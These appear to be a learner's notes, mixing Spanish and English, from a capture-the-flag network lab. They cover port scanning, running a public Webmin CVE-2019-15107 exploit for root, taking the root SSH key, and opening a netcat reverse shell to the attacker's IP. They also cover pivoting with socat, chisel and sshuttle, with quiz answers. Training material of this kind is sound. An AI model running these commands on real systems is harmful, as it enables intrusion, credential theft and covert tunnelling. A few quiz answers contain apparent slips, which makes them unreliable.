- Hay que descargar un archivo de configuración vpn independiente primero.
- Hay 3 máquinas en la red
- Hay un servidor web público
- Hay un servidor git en algun lugar de la red, con información sensitiva
- Hay una pc dentro de la red que tiene un antivirus instalado, windows no se accede directamente


## prod-server

- ip del server
  
```bash
10.200.81.200
```

- escaneo nmap
  
```bash
nmap -n -Pn -p- -v -T5 10.200.81.200

PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack ttl 63
80/tcp    open   http             syn-ack ttl 63
443/tcp   open   https            syn-ack ttl 63
9090/tcp  closed zeus-admin       reset ttl 63
10000/tcp open   snet-sensor-mgmt syn-ack ttl 63



nmap -p 22,80,443,9090,1000 -sV 10.200.81.200

Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-15 03:24 GMT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.0016s latency).

PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.0 (protocol 2.0)
80/tcp   open     http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
443/tcp  open     ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
1000/tcp filtered cadlock
9090/tcp closed   zeus-admin

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds

```

- Agregar al `/etc/hosts`
thomaswreath.thm

- Una vulnerabilidad en el puerto 10000 (cve-2019-15107)
- Clonamos el repo y corremos el exploit
```bash
wget https://raw.githubusercontent.com/MuirlandOracle/CVE-2019-15107/main/CVE-2019-15107.py
python3 -m pip install prompt_toolkit
python3 CVE-2019-15107.py 10.200.194.200 

root@ip-10-10-117-54:~/CVE-2019-15107# python3 -m pip install prompt_toolkit
Collecting prompt_toolkit
  Using cached prompt_toolkit-3.0.36-py3-none-any.whl (386 kB)
Collecting wcwidth
  Using cached wcwidth-0.2.5-py2.py3-none-any.whl (30 kB)
Installing collected packages: wcwidth, prompt-toolkit
Successfully installed prompt-toolkit-3.0.36 wcwidth-0.2.5
WARNING: You are using pip version 20.2.2; however, version 22.3.1 is available.
You should consider upgrading via the '/usr/bin/python3 -m pip install --upgrade pip' command.
root@ip-10-10-117-54:~/CVE-2019-15107# python3 CVE-2019-15107.py 10.200.81.200

	__        __   _               _         ____   ____ _____ 
	\ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
	 \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
	  \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
	   \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

						@MuirlandOracle

		
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.81.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
```
- obtenemos la llave rsa

```bash
# ls /root/.ssh
authorized_keys
id_rsa
id_rsa.pub
known_hosts
# cat /root/.ssh/id_rsa
```

- No conetamos al server como root

```bash
root@ip-10-10-117-54:~# nano id_rsa
root@ip-10-10-117-54:~# chmod 400 id_rsa 
root@ip-10-10-117-54:~# ssh -i id_rsa root@10.200.81.200
^C
root@ip-10-10-117-54:~# ssh -i id_rsa root@10.200.81.200
The authenticity of host '10.200.81.200 (10.200.81.200)' can't be established.
ECDSA key fingerprint is SHA256:THDwSEv1rb9SXkMf4HfQREF1FvH2GtKfaBzVlSsYnuM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.200.81.200' (ECDSA) to the list of known hosts.
[root@prod-serv ~]# 


```
 
 
- Un reverse shell con socat para probar
```bash

./socathack tcp-l:8300 tcp:10.50.82.110:443 &
./nchack 127.0.0.1 8300 -e /bin/bash



nc -lnvp 443
listening on [any] 443 ...
connect to [10.50.82.110] from (UNKNOWN) [10.200.81.200] 43730
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

- chisel
```bash
scp -i ../../../id_rsa chisel_1.7.3_linux_amd64 root@10.200.81.200:/root/chiselhack

```

## Socat

- Use TCP port 8000 for the server listener, and do not background the process: 
`./socat tcp-l:8000 tcp:172.16.0.200:443`

- What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
`./sockat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &`


## Chisel

### Reverse SOCKS Proxy
Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine.

On our own attacking box we would use a command that looks something like this:
`./chisel server -p LISTEN_PORT --reverse &`

On the compromised host, we would use the following command:
`./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`

```
./chisel server -p 1337 --reverse &
./chisel client 10.50.73.2:1337 R:socks &
```

### Forward SOCKS Proxy:
Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.

In many ways the syntax for this is simply reversed from a reverse proxy.

First, on the compromised host we would use:
`./chisel server -p LISTEN_PORT --socks5`

On our own attacking box we would then use:
`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`


### Remote Port Forward:
A remote port forward is when we connect back from a compromised target to create the forward.

For a remote port forward, on our attacking machine we use the exact same command as before:
`./chisel server -p LISTEN_PORT --reverse &`

Once again this sets up a chisel listener for the compromised host to connect back to.
The command to connect back is slightly different this time, however:
`./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`

```
./chisel server -p 1337 --reverse & 
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &

./chisel server -p 1337 --reverse &
./chiselhack client 10.50.82.110:1337 R:8081:10.200.81.150:80
```


### Local Port Forward:
As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target we set up a chisel server:
`./chisel server -p LISTEN_PORT`

We now connect to this from our attacking machine like so:
`./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
`./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

**Answer the questions below**

- What command would you use to start a chisel server for a reverse connection on your attacking machine? Use port 4242 for the listener and **do not** background the process.
`./chisel server -p 4242  --reverse`

- What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
`./chisel client 172.16.0.200:4242 r:socks`

- How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
`./chisel client 172.16.0.200:1337 R:33069:172.16.0.100:3306 &`

- If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
`./chisel client 172.16.0.5:4444 8000:172.16.0.10:80`


## sshuttlee

This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. 

Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy _without the use of proxychains_ (or an equivalent). 

We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server.

- Instalarlo
```
sudo apt install sshuttle

sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

```

**Answer the questions below**
- How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16
`sshuttle -r pwned@172.16.20.7 172.16.0.0/24`

- What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
`--ssh-cmd "ssh -i priv_key"`

- You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?
`-x 172.16.0.100`



## Git Server Enumeration 

